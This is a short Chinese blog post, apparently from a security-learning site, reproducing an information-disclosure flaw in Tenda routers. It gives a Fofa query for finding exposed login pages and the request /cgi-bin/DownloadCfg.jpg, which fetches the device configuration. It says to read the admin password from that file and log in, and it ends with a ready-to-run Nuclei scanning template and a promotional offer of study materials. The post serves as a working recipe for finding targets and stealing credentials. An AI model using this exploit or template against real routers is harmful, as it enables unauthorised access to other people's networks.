# 原创
：  漏洞复现-Tenda 路由器

# 漏洞复现-Tenda 路由器

### 漏洞描述

<br/> Tenda 路由器是深圳市吉祥腾达科技有限公司的一款智能无限路由器。Tenda 路由器存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息网访问该系统。

### <br/> 漏洞复现

<br/> 1、Fofa<br/> title=”Tenda | LOGIN”

2、界面如下

3、POC<br/> /cgi-bin/DownloadCfg.jpg<br/> 4、从配置中查找账户密码(直接打开JPG就行了)

5、成功登录如下

Nucle脚本

```
id: tenda-router-downloadcfg-infolink

info:
name: Tenda 路由器 DownloadCfg 信息泄露漏洞
author:
severity: high
description: Tenda 路由器是深圳市吉祥腾达科技有限公司的一款智能无限路由器。Tenda 路由器存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息网访问该系统。
reference:
- https://
metadata:
fofa-query: title="Tenda | LOGIN"
verified: true
max-request: 1

http:
- raw:
- |
GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
Host: {{Hostname}}

matchers:
- type: dsl
dsl:
- 'status_code==200 &amp;&amp; contains_all(body,"Please")'
```

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/57886659bb364d5e8ce6cf4be530ebff.png" width="1024"/>
